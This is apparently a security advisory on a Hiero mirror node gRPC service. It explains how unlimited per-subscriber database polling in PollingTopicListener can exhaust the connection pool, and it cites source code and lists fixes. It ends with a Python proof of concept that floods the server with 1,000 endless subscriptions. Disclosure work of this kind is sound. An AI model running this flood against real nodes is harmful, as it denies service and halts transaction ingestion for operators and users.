### Title
Unbounded Subscriber Amplification via `PollingTopicListener.listen()` Exhausts Database Connection Pool

### Summary
`PollingTopicListener.listen()` creates an independent database-polling Flux for every subscriber with no global subscriber cap, no per-IP connection limit, and no rate limiting. The only server-side guard (`maxConcurrentCallsPerConnection=5`) limits streams per TCP connection but places no ceiling on the number of TCP connections an attacker may open. An unauthenticated attacker opening many connections can drive an unbounded number of concurrent 500ms-interval DB queries, exhausting the HikariCP connection pool and starving the importer of database access.

### Finding Description

**Exact code path:**

`PollingTopicListener.listen()` — [1](#0-0) 

Every call to `listen()` unconditionally constructs a new `PollingContext` and schedules a `Flux` that calls `topicMessageRepository.findByFilter()` every `interval` (default 500 ms, minimum 50 ms) for `Long.MAX_VALUE` repetitions. [2](#0-1) 

Each poll issues a real SQL query against the database. [3](#0-2) 

**The only server-side guard** is `maxConcurrentCallsPerConnection=5`, applied in `GrpcConfiguration`: [4](#0-3) 

This is configured via `NettyProperties`: [5](#0-4) 

There is no `maxConnections`, no per-IP connection limit, and no total-subscriber enforcement anywhere in the gRPC configuration. The `subscriberCount` field in `TopicMessageServiceImpl` is a Micrometer gauge for observability only — it is never compared against a maximum and never rejects new subscriptions: [6](#0-5) 

The gRPC module has no rate-limiting equivalent to the bucket4j throttle present in the web3 module. [7](#0-6) 

**Exploit flow:**

1. Attacker opens `C` TCP connections to port 5600 (no authentication required).
2. On each connection, attacker opens 5 gRPC streams (`subscribeTopic`) — the per-connection maximum.
3. Total active subscriptions = `5 × C`, each independently polling the DB every 500 ms.
4. Total DB queries per second = `5 × C × 2` (2 polls/s per subscription).
5. At `C = 200` connections (trivially achievable from a single host), that is 2,000 concurrent DB queries/s, each potentially fetching up to `maxPageSize=5000` rows. [8](#0-7) 
6. HikariCP connection pool is exhausted; the importer's write path blocks waiting for a connection.

**Why the existing check fails:**

`maxConcurrentCallsPerConnection=5` bounds streams per TCP connection but imposes no ceiling on the number of TCP connections. An attacker simply opens more connections. There is no `NettyServerBuilder.maxConnectionAge()`, no `maxConnections()`, and no IP-level throttle configured. [9](#0-8) 

### Impact Explanation

Exhausting the database connection pool prevents the importer from writing newly ingested transactions, halting mirror-node state progression. Downstream services (REST API, web3 API) that depend on up-to-date mirror state also degrade. This matches the stated critical scope: network inability to confirm new transactions. The `POLL` listener type must be active (`hiero.mirror.grpc.listener.type=POLL`); the default is `REDIS`, but the POLL type is a documented, supported configuration. [10](#0-9) 

### Likelihood Explanation

No authentication, no API key, and no IP-based rate limit are required. Any host with network access to port 5600 can execute this attack with a trivial gRPC client loop. The attack is repeatable and stateless — the attacker need only keep connections open. The `boundedElastic` scheduler will queue work but does not shed load when the DB pool is saturated. [11](#0-10) 

### Recommendation

1. **Enforce a global subscriber cap** in `TopicMessageServiceImpl.subscribeTopic()`: reject new subscriptions when `subscriberCount` exceeds a configurable maximum.
2. **Add a per-IP connection limit** via `NettyServerBuilder` (e.g., using a custom `ServerTransportFilter` or an Envoy/ingress-level policy).
3. **Add a total-connection limit** via `NettyServerBuilder.maxConnectionAge()` and a connection-count guard.
4. **Apply a gRPC-level rate limiter** (e.g., bucket4j, analogous to the web3 throttle) keyed on client IP before `listen()` is invoked.
5. Consider keeping the default listener type as `REDIS`/`SHARED_POLL` in production, where a single shared poll replaces per-subscriber polls. [12](#0-11) 

### Proof of Concept

```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, mirror_consensus_service_pb2 as pb

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 200   # C TCP connections
STREAMS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = pb.ConsensusTopicQuery(
        topicID=pb.TopicID(topicNum=1),
        # no limit → Long.MAX_VALUE repeats, polls forever
    )
    threads = []
    for _ in range(STREAMS_PER_CONN):
        t = threading.Thread(
            target=lambda: list(stub.subscribeTopic(query))
        )
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

pool = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in pool:
    t.start()
# Result: 200 × 5 = 1,000 concurrent subscriptions,
# each issuing a DB query every 500 ms → ~2,000 queries/s
# → HikariCP pool exhausted → importer write path blocked
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L31-31)
```java
    private final Scheduler scheduler = Schedulers.boundedElastic();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L34-49)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L51-62)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L17-35)
```java
class GrpcConfiguration {

    @Bean
    @Qualifier("readOnly")
    TransactionOperations transactionOperationsReadOnly(PlatformTransactionManager transactionManager) {
        var transactionTemplate = new TransactionTemplate(transactionManager);
        transactionTemplate.setReadOnly(true);
        return transactionTemplate;
    }

    @Bean
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-55)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L26-30)
```java
    private int maxPageSize = 5000;

    @DurationMin(millis = 50)
    @NotNull
    private Duration interval = Duration.ofMillis(500L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L36-43)
```java
    @NotNull
    private ListenerType type = ListenerType.REDIS;

    public enum ListenerType {
        POLL,
        REDIS,
        SHARED_POLL
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedPollingTopicListener.java (L41-52)
```java
        topicMessages = Flux.defer(() -> poll(context).subscribeOn(scheduler))
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "shared poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnCancel(() -> log.info("Cancelled polling"))
                .doOnError(t -> log.error("Error polling the database", t))
                .doOnSubscribe(context::onStart)
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
```
